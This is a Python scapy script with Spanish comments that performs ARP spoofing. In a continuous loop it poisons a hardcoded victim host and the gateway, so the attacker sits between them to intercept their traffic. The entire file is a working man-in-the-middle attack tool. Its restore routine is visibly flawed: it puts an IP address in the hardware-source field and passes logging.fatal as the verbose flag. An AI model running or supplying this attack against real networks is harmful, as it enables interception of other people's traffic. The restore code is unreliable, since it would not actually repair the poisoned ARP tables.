from logging import fatal
import scapy.all as scapy
import time

def get_mac(ip): #ip que vamos a escanear
    arp_request = scapy.ARP(pdst = ip) #¿quien tiene este ip? -> ese ip nos va a responder
    broadcast = scapy.Ether(dst = 'ff:ff:ff:ff:ff:ff') #enviamos a la red la consulta de quien tiene el ip, el mac ff:ffetc es para que todos vean la peticion
    arp_request_broadcast = broadcast/arp_request

    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0] #Recorre la subred, y pregunta a todos los conectados sus ip
    #print(answered_list[0][1])
    return answered_list [0][1].hwsrc #guardo en la lista el mac de la victima

def spoof(target_ip, spoof_ip):
    #creo un paquete ARP
    #op =2 para convertirlo despues en una respuesta
    #envio un paquete a la victima (adjunto su ip y su mac) , y le digo que soy el router (adjunto ip router))
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(des_ip, source_ip):
    des_mac = get_mac(des_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=des_ip, hwdst=des_mac, psrc=source_ip, hwsrc=source_ip)
    scapy.send(packet, count = 4, verbose=fatal)

target_ip = '192.168.1.51'
pasarela_ip = '192.168.1.1'


send_packet_count = 0
try: #Has esto
    #si la victima entra a internet, el spoof se apaga, por eso hacemos un bucle infinito
    while True:
        #el primero es el target, el segundo es quien soy
        spoof(target_ip, pasarela_ip) #le digo a la victima que soy el router
        spoof(pasarela_ip, target_ip) #le digo al router que soy la victima
        send_packet_count = send_packet_count + 2
        print("\r[+] Paquetes enviados: " + str(send_packet_count), end=" "),
        time.sleep(2) #aca dos segundos se vuelve a ejecutar
except KeyboardInterrupt: #si detecta un control + c:
    print('[+]Detectado Ctrol + C ...... Deteniendo ARP_Spoofer')
    restore(target_ip,pasarela_ip)
    restore(pasarela_ip,target_ip)